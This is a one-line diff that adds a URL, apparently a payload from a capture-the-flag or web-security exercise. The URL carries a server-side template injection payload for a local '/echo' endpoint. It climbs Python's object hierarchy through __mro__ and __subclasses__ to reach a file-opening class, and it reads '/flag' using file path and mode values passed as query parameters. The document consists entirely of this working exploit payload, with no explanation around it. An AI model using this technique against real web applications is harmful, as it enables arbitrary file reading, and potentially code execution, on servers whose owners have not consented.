@@ -1,0 +1,1 @@
+http://127.0.0.1:8082/echo?s={{%20request.__class__.__mro__[10].__subclasses__()[40](request.args.file,request.args.write).read()}}&file=/flag&write=r
